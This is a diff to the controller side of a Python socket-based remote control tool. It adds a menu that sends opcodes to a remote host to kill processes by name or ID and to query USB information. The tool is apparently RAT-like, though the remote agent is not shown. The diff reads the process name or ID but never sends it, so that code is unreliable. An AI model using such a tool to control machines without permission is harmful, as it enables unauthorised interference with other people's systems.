@@ -4,6 +4,7 @@
 # 导入socket库:
 import socket
 import connect
+import time
 
 # 变量定义
 ACTIVE = 1
@@ -95,7 +96,50 @@ def Process(sock):
     data = b''.join(buffer)
     data = data.decode('utf-8')
     print('\n%s\n' % data)
+    while True:
+        print('\033[0;32;48m[+]\033[0m More Info:')
+        print('[1] Kill by Name')
+        print('[2] Kill by ID')
+        print('[3] USB Info')
+        print('[0] Exit\n')
+        if Processmanage(sock):
+            break
     return
+
+# 进程操作
+def Processmanage(sock):
+    while True:
+        Input = input('>>> Order ID: ')
+        if not Input:
+            print('\033[0;33;48m[-]\033[0mYou must choose one function.\n')
+        elif Input.isdecimal():
+            Input = int(Input)
+            if Input == 0:
+                return True
+            elif Input == 1 or Input == 2 or Input == 3:
+                if Input == 1:
+                    sock.send(b'2x01')
+                    Input = input('>>> Process Name: ')
+                elif Input == 2:
+                    sock.send(b'2x02')
+                    Input = input('>>> Process ID: ')
+                elif Input == 3:
+                    sock.send(b'2x03')
+                buffer = []
+                while True:
+                    d = sock.recv(1024)
+                    if d != b'End':
+                        buffer.append(d)
+                    else:
+                        break
+                data = b''.join(buffer)
+                data = data.decode('utf-8')
+                print('\n%s\n' % data)
+                return False
+            else:
+                print('\033[0;33;48m[-]\033[0mWrong ID. Please choose another one (? to get list).\n')
+        else:
+            print('\033[0;33;48m[-]\033[0mWrong Input.You must choose a correct function (? to get list).\n')
 
 # 主程序
 print('\n\n')
@@ -126,6 +170,7 @@ if ACTIVE == 1:
     s = connect.Connect()
 else:
     s = connect.Listen()
+# 功能部分
 Functions()
 while True:
     Input = input('>>> Function ID (? to get list): ')
@@ -146,7 +191,7 @@ while True:
         elif Input == 1:
             Information(s)
         elif Input == 2:
-            print('2')
+            Process(s)
         elif Input == 3:
             print('3')
         else:
